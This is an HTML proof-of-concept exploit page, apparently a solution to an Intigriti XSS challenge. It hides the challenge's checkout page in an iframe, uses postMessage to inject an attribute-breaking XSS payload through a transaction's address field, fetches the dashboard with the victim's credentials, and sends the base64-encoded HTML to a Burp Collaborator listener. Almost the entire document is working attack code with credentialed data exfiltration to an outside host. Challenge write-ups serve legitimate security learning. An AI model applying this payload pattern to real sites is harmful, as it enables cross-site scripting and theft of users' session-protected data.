<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Intigriti Challenge</title>
</head>
<body>
    <h1>Exploit Sent to Bot...</h1>
    
    <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="width:0;height:0;border:0;"></iframe>

    <script>
        // CONFIGURATION
        const BASE_URL = 'https://challenge-0126.intigriti.io';
        // Your Burp Collaborator
        const LISTENER = 'http://3hlm5jcmzv03ev6im3t9niq43v9mxfl4.oastify.com';

        const frame = document.getElementById('target');
        
        frame.onload = function() {
            // Prevent infinite loop when we redirect the iframe later
            if (this.src.includes('marketwatch')) return;

            setTimeout(() => {
                
                // --- THE FIXED PAYLOAD ---
                // 1. Fetch dashboard.html
                // 2. Use .text() to get the raw HTML source
                // 3. We use btoa() to Base64 encode it so the HTML tags don't break your URL
                
                const fetchCode = `
                    fetch('/dashboard.html', {credentials: 'include'})
                    .then(r => r.text())
                    .then(html => {
                        // Send the full HTML source (which contains the hidden flag)
                        location = '${LISTENER}/?data=' + btoa(html.substring(0, 2000));
                    })
                `;

                // Flatten code for injection
                const safeCode = fetchCode.replace(/\n/g, ' ');
                // Break out of title attribute
                const xss = `"><img src=x onerror="${safeCode}">`;

                // 3. Send the Message
                frame.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        currency: '1337COIN', // Valid currency for Admin
                        amount: 1337, 
                        toAddress: xss
                    }
                }, '*');

                // 4. Redirect to MarketWatch to trigger the trap
                setTimeout(() => {
                    frame.src = BASE_URL + '/marketwatch.html';
                }, 1500);

            }, 2000);
        };
    </script>
</body>
</html>
